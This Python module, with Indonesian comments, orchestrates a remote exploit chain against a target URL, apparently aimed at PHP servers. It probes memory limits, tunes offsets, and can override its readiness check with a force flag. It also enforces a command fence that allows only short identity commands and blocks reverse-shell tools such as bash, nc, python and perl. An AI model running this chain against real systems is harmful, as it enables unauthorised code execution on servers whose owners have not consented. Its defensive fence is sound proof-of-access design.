"""runner.py — orkestrasi exploit + pagar perintah + bukti otomatis.

Pagar (proof-of-access design) DITEGAKKAN DI SINI, sebelum ada pun I/O jaringan:
  - perintah maks 14 byte, whitelist identitas saja
  - operator shell (>&|;`$...) ditolak
  - primitif reverse-shell (bash/nc/python/...) diblokir permanen
  - --revshell TIDAK ADA di parser dan diblokir di level runner

Ini yang membedakan toolkit ini dari backdoor: ia MEMBUKTIKAN dampak, bukan
memperkanya jadi senjata.
"""

from __future__ import annotations

from dataclasses import dataclass, field

from .chain import ChainConfig, ChainResult, run_chain
from .config import (
    MAX_CMD_BYTES,
    build_command_preview,
    validate_command,
)
from .memprobe import compute_send_mb, probe_memory_limit
from .preflight import preflight
from .detect import detect
from .transport import Transport

DEFAULT_CMD = "id"


@dataclass
class RunOutcome:
    success: bool = False
    proof: str = ""
    blind: bool = False
    error: str = ""
    result: ChainResult | None = None
    log: list[str] = field(default_factory=list)


def _reject(reason_key: str, kwargs: dict | None = None, log: list[str] | None = None) -> RunOutcome:
    msg = reason_key
    if kwargs:
        msg += " " + repr(kwargs)
    if log is not None:
        log.append(f"FENCE-REJECT: {msg}")
    return RunOutcome(success=False, error=msg)


def validate_and_preview(cmd: str, proof_file: str | None,
                         extra_allow: tuple[str, ...] = ()) -> tuple[bool, str, str]:
    """Validasi + susun perintah final. Mengembalikan (ok, err, preview)."""
    # Blokir primitif reverse-shell di sini juga (defense-in-depth).
    low = (cmd or "").strip().lower()
    if low.startswith(("bash", "sh ", "/bin/sh", "nc ", "python", "perl")):
        return False, "fence.revshell_blocked", ""
    v = validate_command(cmd, extra_allow)
    if not v.ok:
        return False, v.reason_key, ""
    try:
        preview = build_command_preview(cmd, proof_file)
    except ValueError:
        return False, "fence.blocked_char", ""
    return True, "", preview


def run(
    url: str,
    t: Transport,
    *,
    cmd: str = DEFAULT_CMD,
    proof_file: str | None = None,
    extra_allow: tuple[str, ...] = (),
    profile: str = "bookworm",
    force: bool = False,
    assume_yes: bool = False,
    huge_mb: int | None = None,
    retries: int = 3,
    timeout: int = 300,
    zif_offset: int | None = None,
    dtor_offset: int | None = None,
    htdata_offset: int | None = None,
    no_pre_rotate: bool = False,
    no_retry_rotate: bool = False,
    no_oom: bool = False,
) -> RunOutcome:
    """Jalankan exploit dengan semua pagar terpasang."""
    log: list[str] = []
    out = RunOutcome(log=log)

    # ① Pagar perintah — SEBELUM sentuh jaringan.
    ok, err, preview = validate_and_preview(cmd, proof_file, extra_allow)
    if not ok:
        return _reject(err, log=log)
    log.append(f"command preview: {preview} (max {MAX_CMD_BYTES}B, identity-only)")

    # ② Preflight: hanya jalan bila READY (tanpa --force).
    d = detect(url, t, check_oom=(None if not no_oom else False))
    p = preflight(d)
    if not p.ready and not force:
        log.append("target NOT ready; use --force to override")
        out.error = "preflight.not_ready"
        return out
    log.append(f"preflight: score={p.score}/90 ready={p.ready} support={p.support}")

    # ③ memory_limit -> ukuran field stage-1 (tidak menebak).
    if huge_mb is not None:
        send_mb = huge_mb
        log.append(f"huge_mb override: {send_mb} MB")
    else:
        limit = probe_memory_limit(url, t)
        mp = compute_send_mb(limit)
        if mp.source == "too-high":
            log.append("memory_limit > 512 MB; chain will not run here")
            out.error = "exploit.memory_limit_too_high"
            return out
        send_mb = mp.send_mb
        if mp.source == "probe":
            log.append(f"memory_limit {mp.limit_bytes // (1024*1024)} MiB read; "
                       f"'big' field set to {send_mb} MB")
        else:
            log.append(f"memory_limit unreadable; using default {send_mb} MB")

    # ④ Jalankan rantai.
    cfg = ChainConfig(
        url=url, cmd=preview, profile=profile,
        zif_offset=zif_offset, dtor_offset=dtor_offset,
        htdata_offset=htdata_offset, huge_mb=send_mb,
        retries=retries, timeout=timeout,
        pre_rotate=not no_pre_rotate, retry_rotate=not no_retry_rotate,
    )
    cr = run_chain(cfg, t)
    out.result = cr
    log.extend(cr.traces)
    out.success = cr.success
    out.blind = cr.blind
    out.proof = cr.proof
    out.error = cr.error
    return out
